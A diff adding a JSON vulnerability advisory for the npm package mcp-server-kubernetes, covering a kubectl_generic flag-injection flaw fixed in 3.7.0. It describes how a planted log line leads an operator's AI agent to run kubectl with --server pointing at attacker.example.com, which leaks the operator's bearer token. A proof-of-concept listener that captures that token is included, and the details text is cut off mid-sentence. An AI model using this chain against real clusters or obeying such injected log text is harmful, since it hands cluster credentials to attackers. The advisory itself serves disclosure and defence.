@@ -1,0 +1,62 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0069",
+  "modified": "2026-06-12T19:30:08.332930648Z",
+  "published": "2026-06-05T15:40:00Z",
+  "aliases": [
+    "GHSA-6mx4-4h42-r8vh",
+    "CVE-2026-47250"
+  ],
+  "summary": "mcp-server-kubernetes: MCP Server Kubernetes: kubectl-generic flag injection enables Kubernetes bearer token exfiltration",
+  "details": "### Summary\nThe `kubectl_generic` tool in `mcp-server-kubernetes` passes user-supplied flags directly to kubectl without any allowlist, enabling a **privilege escalation attack** within Kubernetes environments. An attacker who already has limited cluster or codebase access, for example, a developer with pod-deployment permissions but not cluster-admin credentials, can plant a single structured JSON line in an application's log output. When an operator with a privileged kubeconfig uses the MCP server to read those logs and their AI agent follows the injected instruction, `kubectl_generic` is called with `--server=https://attacker.example.com` and `--insecure-skip-tls-verify=true`. kubectl sends all API requests,  including the `Authorization: Bearer <token>` header from the operator's kubeconfig to the attacker's endpoint. The captured token can then be replayed directly against the real Kubernetes API server, granting the attacker the full RBAC permissions of the operator's service account.\n\nThe token exfiltration mechanism was confirmed end-to-end with no cluster required. The full attack chain including indirect prompt injection via real pod logs was additionally confirmed using a live kind cluster and Claude Haiku (Anthropic API) as the agent.\n\n\n### Details\n### Vulnerable code\n\n`src/tools/kubectl-generic.ts`, lines 103–118:\n\n```typescript\nif (input.flags) {\n  for (const [key, value] of Object.entries(input.flags)) {\n    if (value === true) {\n      cmdArgs.push(`--${key}`);\n    } else if (value !== false && value !== null && value !== undefined) {\n      cmdArgs.push(`--${key}=${value}`);   // ← no allowlist; any kubectl flag accepted\n    }\n  }\n}\n\nif (input.args && input.args.length > 0) {\n  cmdArgs.push(...input.args);             // ← also unconstrained\n}\n```\n\nBoth the `flags` object and the `args` array are passed verbatim to `execFileSync(\"kubectl\", cmdArgs)`.\n\n### Why two flags are needed\n\nkubectl deliberately suppresses `Authorization: Bearer` headers over plain HTTP connections (a safety feature against cleartext leakage). The attack therefore requires two flags together:\n\n| Flag | Purpose |\n|------|---------|\n| `--server=https://attacker.com` | Redirects kubectl API calls to attacker's endpoint |\n| `--insecure-skip-tls-verify=true` | Allows attacker's self-signed cert; triggers credential sending |\n\nBoth are standard kubectl debugging flags used when connecting to clusters with self-signed certificates, making the injection payload look plausible.\n\n### PoC\n### Step 1 - Static verification\n\n```bash\n# Confirm the flag loop has no allowlist:\ngrep -A 8 \"for.*Object.entries.*flags\" src/tools/kubectl-generic.ts\n```\n\nExpected output shows `cmdArgs.push(--${key}=${value})` with no allowlist check.\n\n### Step 2 - kubectl behaviour test (confirms HTTPS required)\n\n```bash\n# Start a minimal HTTPS listener with a self-signed cert:\nopenssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/k.pem -out /tmp/c.pem \\\n  -subj \"/CN=test\" -days 1 2>/dev/null\n\npython3 - <<'EOF'\nimport ssl, threading, json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass H(BaseHTTPRequestHandler):\n    def log_message(self, *a): pass\n    def do_GET(self):\n        print(f\"Authorization: {self.headers.get('authorization','<none>')}\")\n        self.send_response(401); self.end_headers()\n\nsrv = HTTPServer((\"127.0.0.1\", 19001), H)\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(\"/tmp/c.pem\", \"/tmp/k.pem\")\nsrv.socket = ctx.wrap_socket(srv.socket, server_side=True)\nt = __import__(\"threading\").Thread(target=srv.serve_forever, daemon=True); t.start()\n\nimport subprocess, time; time.sleep(0.3)\nsubprocess.run([\n    \"kubectl\", \"get\", \"pods\",\n    \"--server=https://127.0.0.1:19001\",\n    \"--token=MY-TEST-TOKEN-DOES-THIS-ARRIVE\",\n    \"--insecure-skip-tls-verify=true\"\n], capture_output=True)\ntime.sleep(0.3)\nEOF\n```\n\nExpected output:\n```\nAuthorization: Bearer MY-TEST-TOKEN-DOES-THIS-ARRIVE\n```\n\nThis confirms: kubectl sends the bearer token to any H\n\nImported from OSV GHSA-6mx4-4h42-r8vh.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-6mx4-4h42-r8vh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Flux159/mcp-server-kubernetes/security/advisories/GHSA-6mx4-4h42-r8vh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47250"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Flux159/mcp-server-kubernetes"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Flux159/mcp-server-kubernetes/releases/tag/v3.7.0"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "mcp-server-kubernetes"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.7.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "medium"
+  }
+}
